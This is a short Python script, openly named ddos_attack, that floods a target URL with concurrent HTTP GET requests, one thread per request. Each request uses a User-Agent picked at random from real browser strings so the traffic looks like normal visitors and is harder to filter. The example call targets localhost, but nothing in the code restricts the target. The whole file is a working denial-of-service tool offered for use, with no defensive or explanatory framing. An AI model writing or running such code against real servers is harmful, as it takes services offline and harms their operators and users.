import requests
import threading
import random

def ddos_attack(target_url, request_count):
    def send_request():
        headers = {
            "User-Agent": random.choice([
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
                "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
                "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0",
                "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/604.1"
            ]),
            "Accept": "*/*",
            "Connection": "keep-alive"
        }
        try:
            response = requests.get(target_url, headers=headers)
            print(f"Request sent, status code: {response.status_code}")
        except requests.RequestException as e:
            print(f"Error: {e}")

    threads = []
    for _ in range(request_count):
        thread = threading.Thread(target=send_request)
        thread.start()
        threads.append(thread)

    for thread in threads:
        thread.join()

# Example usage:
# ddos_attack("http://localhost:8000", 1000)
